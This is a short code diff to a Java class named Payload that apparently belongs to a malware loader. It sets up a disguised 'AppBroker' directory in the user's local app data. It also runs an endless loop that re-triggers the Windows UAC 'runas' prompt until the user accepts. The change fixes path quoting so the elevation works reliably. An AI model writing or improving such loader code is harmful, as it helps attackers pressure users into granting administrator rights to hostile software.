@@ -46,7 +46,6 @@ public class Payload {
         }
     }
 
-    // Helper to get the new AppBroker directory
     private static File getLoaderDir() {
         String localAppData = System.getenv("LOCALAPPDATA");
         if (localAppData == null) localAppData = "C:\\";
@@ -167,7 +166,8 @@ public class Payload {
             while (true) {
                 log("Triggering UAC...");
                 
-                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
+                // FIX: Wrap javaExe in quotes to handle paths with spaces
+                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", "\"" + javaExe + "\"", cmdArgs, null, 1);
                 
                 if (result > 32) {
                     log("UAC Accepted. Waiting for elevated process...");
